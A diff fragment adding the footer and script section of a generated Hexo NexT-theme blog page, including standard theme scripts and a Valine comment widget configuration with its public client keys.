+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
